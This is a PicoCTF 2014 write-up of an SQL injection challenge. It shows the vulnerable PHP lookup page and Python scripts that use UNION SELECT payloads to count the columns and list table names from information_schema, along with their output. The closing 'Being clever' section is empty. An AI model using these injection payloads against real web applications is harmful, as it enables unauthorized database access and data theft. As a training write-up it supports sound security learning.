### Injection3

This challenge is from PicoCTF 2014. Similar to the previous injection challenge, we are given a vulnerable web application with a login page. The following is the PHP source code of the login page.
```
include "config.php";
$con = mysqli_connect("localhost", "sql3", "sql3", "sql3");
$username = mysqli_real_escape_string($con, $_POST["username"]);
$password = mysqli_real_escape_string($con, $_POST["password"]);
$query = "SELECT * FROM ${table_prefix}users WHERE username='$username' AND password='$password'";
$result = mysqli_query($con, $query);

if (mysqli_num_rows($result) === 1) {
  $row = mysqli_fetch_array($result);
  echo "<h1>Logged in!</h1>";
  if ($row["username"] === "admin") {
    echo "<p>Your flag is: $FLAG</p>";
  } else {
    echo "<p>Only admin can see the flag.</p>";
  }
} else {
  echo "<h1>Login failed.</h1>";
}
?>
```
It seems well protected. However, on this login page, there is a link to another page called ```lookup_user.php```. Let's look at its source code.
```
 <?php
include "config.php";
$con = mysqli_connect("localhost", "sql3", "sql3", "sql3");
// ID is escaped, so this must be safe, right?
$id = mysqli_real_escape_string($con, $_GET["id"]);

if (intval($_GET["debug"])) {
  echo "<pre>";
  echo "id: ", htmlspecialchars($id);
  echo "</pre>";
}

$query = "SELECT * FROM ${table_prefix}users WHERE id=$id";
$result = mysqli_query($con, $query);

if (mysqli_num_rows($result) !== 1) {
  die("<p>Could not find user.</p>");
}

$row = mysqli_fetch_array($result);
echo "<pre>";
echo "User info for ", htmlspecialchars($row["username"]), "\n";
echo "Display name: ", htmlspecialchars($row["display_name"]), "\n";
echo "Location: ", htmlspecialchars($row["location"]), "\n";
echo "E-mail: ", htmlspecialchars($row["email"]), "\n";
echo "</pre>";
echo '<a href="lookup_user.phps">View source</a>';
?>
```
Although it does seem as well protected as the previous one, there is one key difference that makes this code vulnerable to injection: ```$id``` is not enclosed in quotation ```'```. 

The simple fact is, ```mysqli_real_escape_string``` function escapes special strings, but does not necessarily prevent injection like the one we are going to perform, ```UNION SELECT```. 

Our first goal of this challenge is to find out the table name. Right now, with ```{table_prefix}``` in place, it is impossible to obtain the admin password because we don't know to which table we issue the query! This is where ```information_schema.tables``` comes in.

In MySQL, ```information_schema.tables``` table contains all the metadata related to table objects. In this case, we focus on the field ```table_name```. 

Before that though, in order to succeed in ```UNION SELECT```, we have to do two things

1. match the # of columns of the tables
2. match the data types of the columns

Assuming that all the entries in the ```{table_prefix}user``` are of type ```VARCHAR```, We can write a little Python code to do find the # of columns
```
import requests

url = "http://web2014.picoctf.com/injection3/lookup_user.php?id=0"

query = " AND 1=0 UNION SELECT table_name"
last  = " FROM information_schema.tables LIMIT 1" 
add = ",table_name"

for count in range(1,20):
    print "# of columns " + str(count)
    resp = requests.get((url + query + last).replace(" ", "%20"))
    query = query + add
    #if "users" in resp.text:
    print(resp.text + "\n")
```
A rather lousy code, but it does the job. The output is as follows
```
# of columns 1
<p>Could not find user.</p>

# of columns 2
<p>Could not find user.</p>

# of columns 3
<p>Could not find user.</p>

# of columns 4
<p>Could not find user.</p>

# of columns 5
<p>Could not find user.</p>

# of columns 6
<p>Could not find user.</p>

# of columns 7
<pre>User info for CHARACTER_SETS
Display name: CHARACTER_SETS
Location: CHARACTER_SETS
E-mail: CHARACTER_SETS
</pre><a href="lookup_user.phps">View source</a>

# of columns 8
<p>Could not find user.</p>
```
So it can be concluded that the number of columns is 7! Now we can get ready to find the table name! There are two ways to do this.
1. Brute force

In SQL, there is a useful argument called ```OFFSET``` which allows you to look at the table rows starting at a particular entry point. 
Athough we have to ```LIMIT``` our query to 1, by using OFFSET we can brute force through all the rows of ```information_schema.tables```! A code would be something like this
```
import requests

url = "http://web2014.picoctf.com/injection3/lookup_user.php?id=0"

query = " AND 1=0 UNION SELECT table_name,table_name,table_name,table_name,table_name,table_name,table_name FROM information_schema.tables LIMIT 1 OFFSET %d" 
offset = 0
while True:
    resp = requests.get((url + (query % offset)).replace(" ", "%20"))
    offset += 1
    if(resp.text == "<p>Could not find user.</p>"):
        break
    print(resp.text)
```
NOTE:
```SELECT column1, ... FROM table1 LIMIT intA OFFSET intB;```
```SELECT column1, ... FROM table1 LIMIT intB, intA;```
have the same meaning.

When we run it, 
```
<pre>User info for CHARACTER_SETS
Display name: CHARACTER_SETS
Location: CHARACTER_SETS
E-mail: CHARACTER_SETS
</pre><a href="lookup_user.phps">View source</a>
<pre>User info for COLLATIONS
Display name: COLLATIONS
Location: COLLATIONS
E-mail: COLLATIONS
</pre><a href="lookup_user.phps">View source</a>
<pre>User info for COLLATION_CHARACTER_SET_APPLICABILITY
Display name: COLLATION_CHARACTER_SET_APPLICABILITY
Location: COLLATION_CHARACTER_SET_APPLICABILITY
E-mail: COLLATION_CHARACTER_SET_APPLICABILITY
</pre><a href="lookup_user.phps">View source</a>
<pre>User info for COLUMNS
Display name: COLUMNS
Location: COLUMNS
E-mail: COLUMNS
</pre><a href="lookup_user.phps">View source</a>
<pre>User info for COLUMN_PRIVILEGES
Display name: COLUMN_PRIVILEGES
Location: COLUMN_PRIVILEGES
E-mail: COLUMN_PRIVILEGES
</pre><a href="lookup_user.phps">View source</a>
...
<pre>User info for super_secret_users
Display name: super_secret_users
Location: super_secret_users
E-mail: super_secret_users
</pre><a href="lookup_user.phps">View source</a>
```
Quite visibly, the table whose name we want to know is the only user-created table (since everything else is in lowercase), and is called ```super_secret_users```!

2. Being clever

```

```

```
```
```


